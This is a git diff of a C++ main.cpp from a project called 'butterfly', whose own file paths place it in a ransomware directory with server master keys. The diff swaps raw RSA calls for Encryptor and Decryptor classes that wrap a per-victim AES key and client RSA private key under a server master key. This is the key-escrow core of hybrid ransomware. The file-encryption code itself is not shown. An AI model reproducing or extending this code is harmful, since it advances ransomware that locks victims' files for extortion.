@@ -3,9 +3,8 @@
 
 #include "argumentParser.h"
 #include "directoryIterator.h"
-#include "crypto/rsaEncryptor.h"
-#include "crypto/rsaDecryptor.h"
-
+#include "crypto/encryptor.h"
+#include "crypto/decryptor.h"
 
 int main(int argc, char* argv[]) {
 
@@ -16,7 +15,16 @@ int main(int argc, char* argv[]) {
     LOG_INFO("Start application "<< PROJECT_NAME << " with version " << arg._version);
     //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());
 
+    std::unique_ptr<butterfly::Encryptor> encryptor(new butterfly::Encryptor());
+    encryptor->encryptAESKey();
+    encryptor->encryptCPrivateRSA();
 
+    sleep(2);
+
+    std::unique_ptr<butterfly::Decryptor> decryptor(new butterfly::Decryptor());
+    decryptor->decryptCPrivateRSA();
+
+    /*
     std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptor(new butterfly::RSAEncryptor(2048));
 
     rsaEncryptor->saveClientPrivateRSAKeyFile();
@@ -38,18 +46,30 @@ int main(int argc, char* argv[]) {
         rsaEncryptorFile->saveEncryptedKeyFile("CPrivateRSA.bin", cPrivateRSAEnc, rsaEncryptorFile->getEvpPkeySize(pkey1));
     }
 
-    /*
+
     sleep(2);
 
-    std::unique_ptr<butterfly::RSADecryptor> rsaDecryptor(new butterfly::RSADecryptor());
 
-    std::string encKey = rsaDecryptor->getBinKeyFileContents("AESKey.bin");
-    EVP_PKEY *pkey = rsaDecryptor->getEvpPkeyFromFile("CPrivateRSA.pem");
+    std::unique_ptr<butterfly::RSADecryptor> rsaDecryptorCPrivateRSA(new butterfly::RSADecryptor("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem"));
 
-    if (rsaDecryptor->decrypt(pkey, encKey) ) {
-        LOG_TRACE(rsaDecryptor->getDecryptedKey())
-    }*/
+    std::string encCPrivateRSA = rsaDecryptorCPrivateRSA->getBinKeyFileContents("CPrivateRSA.bin");
+    EVP_PKEY *pkey = rsaDecryptorCPrivateRSA->getEvpPkey();
+    //EVP_PKEY *pkey = rsaDecryptorCPrivateRSA->getPkeyFromPrivateKeyFile("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem");
+    std::string decCPrivateRSA;
+    if (rsaDecryptorCPrivateRSA->decrypt(pkey, encCPrivateRSA)) {
+        decCPrivateRSA = rsaDecryptorCPrivateRSA->getDecryptedKey();
+        LOG_TRACE("decryptedCPrivateRSA: " << decCPrivateRSA)
+    }
 
+    std::unique_ptr<butterfly::RSADecryptor> rsaDecryptorAES(new butterfly::RSADecryptor(decCPrivateRSA));
+
+    std::string encAESKey = rsaDecryptorAES->getBinKeyFileContents("AESKey.bin");
+    //EVP_PKEY *pkey = rsaDecryptorAES->getEvpPkeyFromFile("CPrivateRSA.pem");
+    EVP_PKEY *pkey1 = rsaDecryptorAES->getEvpPkey();
+    if (rsaDecryptorAES->decrypt(pkey1, encAESKey) ) {
+        LOG_TRACE(rsaDecryptorAES->getDecryptedKey())
+    }
+    */
 
     return 0;
 }
